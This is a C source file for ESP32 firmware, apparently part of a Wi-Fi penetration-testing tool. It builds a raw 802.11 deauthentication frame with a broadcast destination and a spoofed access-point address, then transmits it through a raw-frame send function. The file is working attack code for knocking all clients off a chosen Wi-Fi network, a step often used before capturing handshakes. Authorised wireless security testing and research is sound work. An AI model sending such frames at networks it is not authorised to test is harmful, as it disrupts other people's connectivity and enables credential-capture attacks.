/**
 * @file wsl_bypasser.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-05
 * @copyright Copyright (c) 2021
 * 
 * @brief Implementation of Wi-Fi Stack Libaries bypasser.
 */
#include "wsl_bypasser.h"

#include <stdint.h>
#include <string.h>

#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"

static const char *TAG = "wsl_bypasser";

static bool bypasser_initialized = false;

void wsl_bypasser_init(void){
    ESP_LOGI(TAG, "WSL Bypasser initialized");
    bypasser_initialized = true;
}

void wsl_bypasser_deinit(void){
    ESP_LOGI(TAG, "WSL Bypasser deinitialized");
    bypasser_initialized = false;
}

/**
 * @brief Deauthentication frame template
 * 
 * Destination address is set to broadcast.
 * Reason code is 0x2 - INVALID_AUTHENTICATION (Previous authentication no longer valid)
 * 
 * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
 */
static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

int wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
    if (!bypasser_initialized) {
        ESP_LOGW(TAG, "Bypasser not initialized");
        return ESP_ERR_INVALID_STATE;
    }
    
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false);
    
    if (result != ESP_OK) {
        ESP_LOGD(TAG, "Frame send failed: %d", result);
    }
    
    return result;
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record){
    ESP_LOGD(TAG, "Sending deauth frame...");
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
    
    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}